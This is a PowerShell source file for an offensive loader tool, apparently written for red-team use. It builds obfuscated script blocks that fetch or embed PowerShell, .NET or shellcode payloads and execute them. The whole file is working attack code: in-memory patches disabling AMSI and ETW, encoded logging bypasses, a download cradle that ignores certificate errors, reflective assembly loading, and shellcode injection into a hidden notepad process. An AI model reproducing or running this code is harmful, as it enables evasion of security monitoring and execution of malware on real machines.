#requires -version 3

Function New-PowerLoader {
<#
.SYNOPSIS
    Build script block which safely loads PowerShell, .NET assembly or shellcode.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    New-PowerLoader builds PowerShell script block embedding download cradle or local file as payload.
    Resulting script block is fully compatible with PowerShell v2.

.PARAMETER Type
    Specifies the payload type, defaults to PoSh.

.PARAMETER FilePath
    Specifies a local payload.

.PARAMETER FileUrl
    Specifies a remote payload.

.PARAMETER ArgumentList
    Specifies the payload arguments.

.PARAMETER Bypass
    Specifies the bypass techniques to include.

.PARAMETER ClearComments
    Removes comments from PowerShell payload to be loaded.

.EXAMPLE
    PS C:\> New-PowerLoader -Type PoSh -FileUrl 'https://192.168.0.1/script.ps1' -ArgumentList 'Invoke-Sample','-Verbose' -Bypass SBL,PML

.EXAMPLE
    PS C:\> New-PowerLoader -Type NetAsm -FilePath .\SharpSample.exe -Bypass ETW,AMSI | Invoke-PowerExec -ComputerList 192.168.0.2
#>
    [CmdletBinding()]
    Param (
        [ValidateSet("PoSh","NetAsm","Shellcode")]
        [string]
        $Type = "PoSh",

        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [string]
        $FilePath,

        [string]
        $FileUrl,

        [ValidateNotNullOrEmpty()]
        [string[]]
        $ArgumentList,

        [ValidateSet("AMSI","ETW","SBL","PML")]
        [string[]]
        $Bypass,

        [Switch]
        $ClearComments
    )

    $srcCode = ${function:Get-DecodedByte}.Ast.Extent.Text + [Environment]::NewLine
    if ($FilePath) {
        $bytes = [IO.File]::ReadAllBytes((Resolve-Path $FilePath))
        if ($ClearComments -and $Type -eq "PoSh") {
            $bytes = Remove-PoshComments($bytes)
        }
        $bytes = $bytes | foreach {$_ -bxor 1}
        $encCode = Get-EncodedByte($bytes)
        $srcCode += '$code = Get-DecodedByte("' + $encCode + '") | foreach {$_ -bxor 1}' + [Environment]::NewLine
    }
    elseif ($FileUrl) {
        $srcCode += ${function:Invoke-DownloadByte}.Ast.Extent.Text + [Environment]::NewLine
        $bytes = [Text.Encoding]::UTF8.GetBytes($FileUrl)
        $bytes = $bytes | foreach {$_ -bxor 1}
        $encUrl = Get-EncodedByte($bytes)
        $srcCode += '$code = Invoke-DownloadByte([Text.Encoding]::UTF8.GetString((Get-DecodedByte("' + $encUrl + '") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
        if ($ClearComments -and $Type -eq "PoSh") {
            $srcCode += ${function:Remove-PoshComments}.Ast.Extent.Text + [Environment]::NewLine
            $srcCode += '$code = Remove-PoshComments($code)' + [Environment]::NewLine
        }
    }
    else {
        Write-Error "Either FilePath or FileUrl parameter must be specified" -ErrorAction Stop
    }

    if ($ArgumentList) {
        $args = $ArgumentList -join ','
        $bytes = [Text.Encoding]::UTF8.GetBytes($args)
        $bytes = $bytes | foreach {$_ -bxor 1}
        $encArgs = Get-EncodedByte($bytes)
        $srcArgs = '$args = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("' + $encArgs + '") | foreach {$_ -bxor 1}))).Split('','')' + [Environment]::NewLine
    }
    else {
        $srcArgs = '$args = $null' + [Environment]::NewLine
    }

    $srcBypass = ''
    if ($Bypass -Contains 'AMSI' -or $Bypass -Contains 'ETW') {
        $srcBypass += ${function:Invoke-MemoryPatch}.Ast.Extent.Text + [Environment]::NewLine
    }
    switch ($Bypass) {
        'AMSI' {
            $srcBypass += '$d = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("H4sIAAAAAAAEAEvIKcrQT83NBQCpd2pDCAAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
            $srcBypass += '$f = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("H4sIAAAAAAAEAHPIKcoISkrIdy5JT08pBgCSRCbiDgAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
            $srcBypass += 'if ([IntPtr]::Size -eq 4) {$p = (Get-DecodedByte("H4sIAAAAAAAEANsZxsjWeFiSEQCkiImCCAAAAA==") | foreach {$_ -bxor 1})} else {$p = (Get-DecodedByte("H4sIAAAAAAAEANsZxsjWeAgANMiX0AYAAAA=") | foreach {$_ -bxor 1})}' + [Environment]::NewLine
            $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
        }
        'ETW' {
            $srcBypass += '$d = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("H4sIAAAAAAAEAMsvTc3N1QdiALm3ONgJAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
            $srcBypass += '$f = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("H4sIAAAAAAAEAHMpLXMpT8kvDSvOKE0BAGFTlzkNAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
            $srcBypass += 'if ([IntPtr]::Size -eq 4) {$p = [byte[]] (0xC2, 0x14, 0x00, 0x00)} else {$p = [byte[]] (0xC3)}' + [Environment]::NewLine
            $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
        }
        'SBL' {
            $srcBypass += '$b = "H4sIAAAAAAAEABXMQQrCMBCF4bO4MLRgyRWKgiKIxYoIpYuQjjXVTEInGQnSwxt3b/G+n0P6dld49rImAjtgknvgW5qhFG0iBitPyqsRLHiWdWRnFRvnZauDmXmHTr9E8TcHA/goBZnRK44BSFSicf4SBzS6Is5M52cLfFcYoVz7iFiVDXw25+ENmldi6xDzyHnKRQ/BaHlUNGXTEQfjx14UxaIV6+m7/ADzwv6nuwAAAA=="' + [Environment]::NewLine
            $srcBypass += 'IEX ([Text.Encoding]::UTF8.GetString((Get-DecodedByte($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
        }
        'PML' {
            $srcBypass += '$b = "H4sIAAAAAAAEAI3MsQqDMBAG4GfpIFQoZC+dxDrZIaEPEMKvnsNdMPFExYcXOjv0e4BP87qXDfTRSjczbi2FLEkGNVYWZDeC2XyVmHS9m4/0liYwRdQbwqwk8Q31xOlVDJ4Tnr/MOhf9RPG6qyTjn+sIXsO4HydzXsS6pAAAAA=="' + [Environment]::NewLine
            $srcBypass += 'IEX ([Text.Encoding]::UTF8.GetString((Get-DecodedByte($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
        }
    }

    switch ($Type) {
        'PoSh' {
            $srcLoader = ${function:Invoke-PoshLoader}.Ast.Extent.Text + [Environment]::NewLine
            $srcLoader += 'Invoke-PoshLoader -Code ([Text.Encoding]::UTF8.GetString($code)) -ArgumentList $args'
        }
        'NetAsm' {
            $srcLoader = ${function:Invoke-NetLoader}.Ast.Extent.Text + [Environment]::NewLine
            $srcLoader += 'Invoke-NetLoader -Code $code -ArgumentList $args'
        }
        'Shellcode' {
            $srcLoader = ${function:Invoke-ShellLoader}.Ast.Extent.Text + [Environment]::NewLine
            $srcLoader += 'Invoke-ShellLoader -Code $code'
        }
    }
    $script = $srcCode + $srcArgs + $srcBypass + $srcLoader
    $words = @('Get-DecodedByte','Copy-Stream','Invoke-DownloadByte','Invoke-MemoryPatch','Invoke-PoshLoader','Invoke-NetLoader','Invoke-ShellLoader','Remove-PoshComments')
    $script = Get-ObfuscatedString -InputString $script -BlackList $words
    return [ScriptBlock]::Create($script)
}

Function Local:Remove-PoshComments {
    Param (
        [byte[]] $Bytes
    )

    $strBytes = [BitConverter]::ToString($Bytes)
    $strBytes = $strBytes -replace "3C-23-(.*?)-23-3E"
    $strBytes = $strBytes -replace "23-(.*?)-0A","0A"
    $strBytes = $strBytes -replace "-"
    $byteArray = New-Object Byte[] ($strBytes.Length / 2)
    for ($i = 0; $i -lt $strBytes.Length; $i += 2) {
        $byteArray[$i/2] = [convert]::ToByte($strBytes.Substring($i, 2), 16)
    }
    return $byteArray
}

Function Local:Get-ObfuscatedString {
    Param (
        [String] $InputString,
        [String[]] $BlackList
    )

    foreach($word in $BlackList) {
        $string = -join ((0x41..0x5A) + (0x61..0x7A) | Get-Random -Count 11 | %{[char]$_})
        $InputString = $InputString.Replace($word,$string)
    }
    return $InputString
}

Function Local:Get-EncodedByte {
    Param (
        [Parameter(Mandatory = $True)]
        [byte[]] $ByteArray
    )

    [IO.MemoryStream] $output = New-Object IO.MemoryStream
    $gzipStream = New-Object IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
    $gzipStream.Write($ByteArray, 0, $ByteArray.Length)
    $gzipStream.Close()
    $output.Close()
    $out = $output.ToArray()
    return [Convert]::ToBase64String($out)
}

Function Local:Get-DecodedByte {
    Param (
        [Parameter(Mandatory = $True)]
        [string] $EncBytes
    )

    Function Copy-Stream ($InputStream,$OutputStream) {
        $buffer = New-Object byte[] 4096
        while (($bytesRead = $InputStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $OutputStream.Write($buffer, 0, $bytesRead)
        }
    }
    $byteArray = [Convert]::FromBase64String($EncBytes)
    $input = New-Object IO.MemoryStream(,$byteArray)
    $output = New-Object IO.MemoryStream
    $gzipStream = New-Object IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
    Copy-Stream -InputStream $gzipStream -OutputStream $output
    $gzipStream.Close()
    $input.Close()
    return $output.ToArray()
}

Function Local:Invoke-MemoryPatch {
    Param (
        [string] $Dll,
        [string] $Func,
        [byte[]] $Patch
    )

    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
    $address = [Kernel32]::GetProcAddress([Kernel32]::LoadLibrary($Dll), $Func)
    $a = 0
    [Kernel32]::VirtualProtect($address, [UInt32]$Patch.Length, 0x40, [ref]$a) | Out-Null
    try {
        [Runtime.InteropServices.Marshal]::Copy($Patch, 0, $address, [UInt32]$Patch.Length)
    }
    catch {
        Write-Warning "Memory patch failed."
    }
    finally {
        [Kernel32]::VirtualProtect($address, [UInt32]$Patch.Length, $a, [ref]0) | Out-Null
    }
}

Function Local:Invoke-DownloadByte {
    Param (
        [Parameter(Mandatory=$True)]
        [string] $URL
    )

    $code = $null
    try {
        [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
        try {
            [Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([Net.SecurityProtocolType], 3072)
        }
        catch {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls
        }
        $client = [Net.WebRequest]::Create($URL)
        $client.Proxy = [Net.WebRequest]::GetSystemWebProxy()
        $client.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
        $client.UserAgent = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)'
        $response = $client.GetResponse()
        $respStream = $response.GetResponseStream()
        $buffer = New-Object byte[] $response.ContentLength
        $writeStream = New-Object IO.MemoryStream $response.ContentLength
        do {
            $bytesRead = $respStream.Read($buffer, 0, $buffer.Length)
            $writeStream.Write($buffer, 0, $bytesRead)
        }
        while ($bytesRead -gt 0)
        $code = New-Object byte[] $response.ContentLength
        [Array]::Copy($writeStream.GetBuffer(), $code, $response.ContentLength)
        $respStream.Close()
        $response.Close()
    }
    catch [Net.WebException] {
        Write-Error $_
    }
    return $code
}

Function Local:Invoke-PoshLoader {
    Param (
        [Parameter(Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [string] $Code,

        [string[]] $ArgumentList
    )

    Invoke-Expression "$Code $($ArgumentList -join ' ')"
}

Function Local:Invoke-NetLoader {
    Param (
        [Parameter(Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [byte[]] $Code,

        [string[]] $ArgumentList
    )

    $realStdOut = [Console]::Out
    $realStdErr = [Console]::Error
    $stdOutWriter = New-Object IO.StringWriter
    $stdErrWriter = New-Object IO.StringWriter
    [Console]::SetOut($stdOutWriter)
    [Console]::SetError($stdErrWriter)
    $assembly = [Reflection.Assembly]::Load([byte[]]$Code)
    $al = New-Object -TypeName Collections.ArrayList
    $al.add($ArgumentList) | Out-Null
    try {
        $assembly.EntryPoint.Invoke($null, $al.ToArray())
    }
    catch [Management.Automation.MethodInvocationException] {
        Write-Warning $_
    }
    finally {
        [Console]::SetOut($realStdOut)
        [Console]::SetError($realStdErr)
        $output = $stdOutWriter.ToString()
        $output += $stdErrWriter.ToString();
        Write-Output $output
    }
}

Function Local:Invoke-ShellLoader {
    Param (
        [Parameter(Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $Code
    )

    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(UInt32 processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, int flAllocationType, int flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, ref UInt32 lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("ntdll.dll")]
    public static extern UInt32 NtCreateThreadEx(
        ref IntPtr hThread,
        UInt32 DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        bool CreateSuspended,
        UInt32 StackZeroBits,
        UInt32 SizeOfStackCommit,
        UInt32 SizeOfStackReserve,
        IntPtr lpBytesBuffer
    );
}
"@
    $procStart = [wmiclass]"\\.\root\cimv2:Win32_ProcessStartup"
    $procStart.Properties["ShowWindow"].Value = 0
    $procID = (([wmiclass]"\\.\root\cimv2:Win32_Process").Create("notepad.exe", $null, $procStart)).ProcessId
    $hProc = [Win32]::OpenProcess(0x001F0FFF, $false, $procID)
    $address = [Win32]::VirtualAllocEx($hProc, 0, $Code.Length + 1, 0x1000 -bor 0x2000, 0x04)
    [Win32]::WriteProcessMemory($hProc, $address, $Code, $Code.Length, [ref] 0) | Out-Null
    [Win32]::VirtualProtectEx($hProc, $address, $Code.Length, 0x20, [ref] 0) | Out-Null
    $hRemoteThread = [IntPtr]::Zero
    [Win32]::NtCreateThreadEx([ref]$hRemoteThread, 0x1FFFFF, [IntPtr]::Zero, $hProc, $address, [IntPtr]::Zero, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero) | Out-Null
    if ($hRemoteThread -ne [IntPtr]::Zero) {
        Write-Output "Successful injection."
        [Win32]::CloseHandle($hRemoteThread) | Out-Null
    }
    [Win32]::CloseHandle($hProc) | Out-Null
}